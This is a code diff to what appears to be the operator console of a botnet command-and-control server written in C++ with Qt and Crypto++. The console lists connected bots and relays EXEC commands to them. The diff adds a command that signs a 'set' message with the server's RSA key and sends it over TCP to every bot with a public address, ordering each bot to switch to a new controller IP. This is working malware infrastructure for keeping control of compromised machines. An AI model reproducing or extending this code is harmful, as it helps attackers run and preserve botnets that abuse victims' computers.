@@ -1,4 +1,5 @@
 #include "console.h"
+#include <cryptopp/pssr.h>
 
 Console::Console(Server *server, QObject *parent): QThread(parent), server(server) {
     bot = NULL;
@@ -30,13 +31,15 @@ void Console::processData() {
         emit tellBot(original.toUtf8());
         printing.unlock();
         return;
+    } else if (s == "DUMP") {
+        server->dumpWhitelist();
     } else if (s == "BOTLIST" || s == "LS") {
         printf("bots: \n");
         QVector<Bot*> bots = server->getBots();
         for (int i = 0; i < bots.size(); i++)
             printf("%d: %s white: %d\n", i, bots[i]->peerAddress().toString().toUtf8().constData(), bots[i]->hasWhiteIp);
     } else if (s == "HELP") {
-        printf("help\nbotlist\nls\nset bot\n\nexit\n");
+        printf("help\nbotlist\nls\nset bot\ndump\nexit\nnotice ip.ip.ip.ip");
     } else if (s.left(7) == "SET BOT" || s.left(2) == "CD") {
         if (s.left(2) == "CD")
             bot = server->getBot(QHostAddress(s.right(s.length() - 3)));
@@ -59,10 +62,58 @@ void Console::processData() {
         }
     } else if (s.left(4) == "EXEC" && !bot) {
         server->sendMessage(original.right(original.length() - 5).toUtf8());
+    } else if (s.left(6) == "NOTICE") {
+        QString ip = s.right(s.length() - 7);
+        printf("Switch all bots to ip %s? (y/n) > ", ip.toLocal8Bit().constData());
+        char c;
+        scanf("%c", &c);
+        if (c == 'y')
+            notice(ip);
+        else
+            printf("operation cancelled\n");
     }
 
     invite();
     printing.unlock();
+}
+
+void Console::notice(QString ip) {
+    printf("trying to switch...\n");
+    QVector<Bot*> bots = server->getBots();
+    QByteArray message;
+    QDataStream stream(&message, QIODevice::WriteOnly);
+    stream << 1;
+    stream << QHostAddress(ip).toIPv4Address();
+
+    AutoSeededRandomPool rng;
+    RSASS<PSS, SHA1>::Signer signer(server->getPrivateKey());
+    int len = signer.MaxSignatureLength();
+    SecByteBlock signature(len);
+    signer.SignMessage(rng, (const byte*)message.constData(), message.size(), signature);
+
+    QByteArray sign;
+    for (int i = 0; i < signature.size(); i++)
+        sign.push_back((char)signature[i]);
+
+
+    QByteArray final = "set\n" + message.toBase64() + '\n' + sign.toBase64() + '\n';
+    for (int i = 0; i < bots.size(); i++)
+        if (bots[i]->hasWhiteIp) {
+            printf("trying: %s\n", bots[i]->peerAddress().toString().toLocal8Bit().constData());
+            QTcpSocket socket;
+            socket.connectToHost(bots[i]->peerAddress(), 50947);
+
+            if (!socket.waitForConnected(2000)) {
+                printf("next one\n");
+                continue;
+            }
+
+            socket.write(final);
+            socket.flush();
+            mySleep(2000);
+            socket.close();
+            printf("message sended.\n");
+        }
 }
 
 void Console::log(QString message) {
@@ -91,4 +142,10 @@ void Console::dataFromBot(Bot *b, QByteArray data) {
         printing.unlock();
     } else
         qDebug() << "Unauthorized from " + b->peerAddress().toString();
+}
+
+void Console::mySleep(int msec) {
+    QEventLoop loop;
+    QTimer::singleShot(msec, &loop, SLOT(quit()));
+    loop.exec();
 }
